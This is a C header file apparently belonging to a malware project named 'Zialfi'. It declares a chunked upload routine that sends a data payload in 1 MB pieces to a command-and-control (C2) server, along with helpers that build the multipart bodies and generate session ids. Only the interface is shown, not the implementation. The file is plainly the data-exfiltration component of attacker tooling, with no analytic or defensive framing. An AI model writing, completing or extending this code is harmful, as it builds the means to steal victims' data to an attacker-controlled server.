#ifndef ZIALFI_CHUNKED_H
#define ZIALFI_CHUNKED_H

#include <stdint.h>
#include <stddef.h>

typedef enum {
    CHUNK_COMPLETE = 0,
    CHUNK_PARTIAL  = 1,
    CHUNK_FAILED   = 2,
} chunk_result_t;

/*
 * Upload `data` (length `data_len`) to the C2 in 1 MB chunks.
 *
 *   c2_host / c2_port  — target server
 *   token              — Bearer auth token
 *   data / data_len    — full payload to upload
 *   metadata           — JSON metadata sent with the complete call
 *   metadata_len       — length of metadata
 *
 * Returns CHUNK_COMPLETE on full success, CHUNK_PARTIAL if some
 * chunks succeeded but the complete-call failed, CHUNK_FAILED on
 * hard failure.
 */
chunk_result_t chunked_upload(
    const char  *c2_host,
    uint16_t     c2_port,
    const char  *token,
    const uint8_t *data,
    size_t       data_len,
    const char  *metadata,
    size_t       metadata_len
);

/* ── build multipart bodies (exposed for testing) ──────────────── */

/* Caller must free the returned buffer with free(). */
uint8_t *chunked_build_chunk_body(
    const char  *boundary,
    const char  *session_id,
    size_t       chunk_index,
    const uint8_t *chunk_data,
    size_t       chunk_len,
    size_t      *out_len
);

uint8_t *chunked_build_complete_body(
    const char  *boundary,
    const char  *session_id,
    size_t       total_chunks,
    const char  *metadata,
    size_t       metadata_len,
    size_t      *out_len
);

/* Generate a random 32-char hex session id. Caller frees. */
char *chunked_generate_session_id(void);

#endif /* ZIALFI_CHUNKED_H */
